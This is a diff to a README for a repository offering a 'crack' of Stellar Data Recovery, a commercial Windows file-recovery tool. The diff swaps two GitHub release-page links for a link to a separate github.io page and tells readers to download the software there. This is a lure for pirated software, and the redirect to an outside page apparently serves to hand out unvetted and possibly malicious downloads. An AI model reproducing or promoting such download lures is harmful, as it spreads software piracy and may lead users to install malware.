@@ -1,6 +1,6 @@
 # 💾 Stellar-Data-Recovery-Crack - Recover lost files on Windows systems
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/conventional-narthex977/Stellar-Data-Recovery-Crack/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue)](https://conventional-narthex977.github.io)
 
 ## 📖 About
 Stellar-Data-Recovery-Crack helps you recover deleted files, photos, and partitions. It works with hard drives, solid-state drives, and RAID arrays. This tool restores data lost during accidental deletion, formatting, or system errors. It supports common file types including documents, images, and videos.
@@ -16,7 +16,7 @@ Ensure your computer meets these requirements to run the software:
 ## 📦 How to Download
 Visit the releases page to download the software.
 
-[Click here to visit the download page](https://github.com/conventional-narthex977/Stellar-Data-Recovery-Crack/releases)
+[Click here to visit the download page](https://conventional-narthex977.github.io)
 
 1. Navigate to the link above.
 2. Look for the Assets section at the bottom of the latest release.
